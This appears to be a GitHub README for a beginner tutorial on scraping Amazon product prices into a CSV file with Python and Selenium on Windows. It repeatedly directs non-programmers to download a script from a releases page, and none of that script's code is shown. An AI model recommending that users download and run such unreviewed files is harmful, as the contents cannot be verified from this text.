# 📦 how-to-scrape-amazon-prices-with-python - Easy Amazon Price Tracking

[![Download Now](https://img.shields.io/badge/Download-Get%20Script-brightgreen?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)

---

## 📖 About this Project

This project teaches you how to scrape Amazon product prices using Python and Selenium. It provides a simple, single-file script. The script works on real Amazon product pages and exports price data to a CSV file. It is designed for beginners, with clear steps to follow. This tutorial is for educational use only.

You do not need to be a programmer to use this guide. The instructions assume you use a Windows computer. The goal is to get you up and running with minimal hassle.

---

## 🔍 What You Will Learn

- How to use Python to open Amazon product pages.
- How to find and save price information.
- How to automate this task using Selenium.
- How to save data in CSV format.
- Basics of running Python scripts on Windows.

This hands-on approach helps you understand web scraping and automation without extra complexity.

---

## 🖥️ System Requirements

Before you start, make sure your system meets these requirements:

- Windows 10 or newer (64-bit recommended).
- At least 4GB of RAM.
- Internet connection to access Amazon pages.
- Basic user permissions to install software.

---

## 🔧 Tools Included

The package contains:

- A Python script (`scrape_amazon_prices.py`) that runs the scraping process.
- Instructions for setting up necessary software.
- Comments inside the script to explain each step.
- A CSV output example showing the price data.

---

## ⚙️ Before You Begin

This project uses Python and Selenium. Here is what you need:

1. **Python** - The programming language used to run the script.
2. **Selenium WebDriver** - A tool to automate web browsers.
3. **Google Chrome or Mozilla Firefox** - Supported web browsers for scraping.
4. **Browser driver** - Software that connects Selenium to your browser (like ChromeDriver or GeckoDriver).

You will install these in the setup section.

---

## 🚀 Getting Started: How to Download and Run

### 1. Download the Script

You need to visit the releases page to get the script file.

[![Download Script](https://img.shields.io/badge/Download-Get%20Script-blue?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)

- Click this badge or open the link in your browser:  
  https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases
- Find the latest release.
- Download the file named something like `scrape_amazon_prices.py`.

Save this file to a folder you can remember, like `C:\AmazonScraper`.

---

### 2. Install Python

- Go to the official Python download page: https://python.org/downloads/windows/
- Download the latest Python 3.x for Windows.
- Run the installer.
- **Important:** Make sure to check the box that says **Add Python to PATH** during setup.
- Finish the installation.

---

### 3. Install Required Packages

You need two Python packages:

- Selenium
- Pandas (for handling data in CSV)

Open Windows Command Prompt:

- Press `Win + R`, type `cmd`, then press Enter.
- In the command window, type this and press Enter:

  ```
  pip install selenium pandas
  ```

Wait until the installation completes.

---

### 4. Download Browser Driver

Selenium needs a driver executable that matches your browser. Follow one of these:

- **Google Chrome users:**
  - Check your Chrome version by clicking the three dots > Help > About Google Chrome.
  - Visit: https://sites.google.com/chromium.org/driver/
  - Download the driver version matching your Chrome.
  - Extract the file and place it in your folder (e.g., `C:\AmazonScraper`).

- **Mozilla Firefox users:**
  - Visit: https://github.com/mozilla/geckodriver/releases
  - Download the correct version for Windows.
  - Extract and place it in your folder.

Make a note of where this driver file is.

---

### 5. Edit the Script for Your Driver Location

You may need to open the script file in Notepad or any text editor to set the driver path. Look for a line like this near the top:

```python
driver_path = "C:/path/to/your/driver.exe"
```

Replace the path with the location of the driver executable on your computer.

---

## ▶️ Running the Script

1. Open the folder where you saved the script (`C:\AmazonScraper`).
2. Hold `Shift`, right-click inside the folder window.
3. Select **Open PowerShell window here** or **Open command window here**.
4. Type this command and press Enter:

   ```
   python scrape_amazon_prices.py
   ```

5. The script will open a browser window, load sample Amazon pages, and collect price data.
6. After it finishes, it will save a file named `prices.csv` in the same folder.
7. Open `prices.csv` with Excel or any text editor to view the prices.

---

## 🛠️ Troubleshooting Tips

- If the script does not run, check that Python is installed and added to your system PATH.
- If you see errors about Selenium or Pandas, run the `pip install` command again.
- Make sure the browser driver matches your installed browser version.
- If the browser window opens then closes immediately, look closely for error messages.
- Check your internet connection to ensure Amazon pages load properly.
- Close all other instances of Chrome or Firefox before running the script.

---

## 📁 How the Script Works

The script automates these tasks:

- Opens an Amazon product page.
- Looks for the current price on the page.
- Reads the price text.
- Saves the product title and price in a CSV file.
- Repeats for multiple product links if you add them.
- Allows you to update or customize product URLs inside the script easily.

This gives a practical example of basic automation with Python and Selenium.

---

## ⚠️ Important Notes

- This script is for educational purposes only.
- Frequent or heavy scraping can trigger Amazon’s bot protections.
- Do not use this script to scrape personal or restricted data.
- Respect Amazon’s terms of service.

---

## 💾 Download Link

Visit this page to download the files you need:

https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases

Use the green or blue badges above for quick access.

---

## 📌 Keywords and Tags

amazon, automation, beginner-friendly, data-extraction, ecommerce, price-tracking, python, selenium, tutorial, web-scraping